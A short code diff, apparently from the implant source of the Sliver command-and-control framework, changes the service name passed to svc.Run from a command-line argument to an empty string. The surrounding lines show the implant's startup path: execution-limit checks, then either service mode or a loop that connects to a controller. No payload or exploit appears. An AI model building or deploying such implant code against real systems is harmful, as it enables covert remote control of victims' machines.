@@ -145,7 +145,7 @@ func main() {
 	limits.ExecLimits() // Check to see if we should execute
 
 	// {{if .IsService}}
-	svc.Run(os.Args[1], &sliverService{})
+	svc.Run("", &sliverService{})
 	// {{else}}
 	for {
 		connection := transports.StartConnectionLoop()
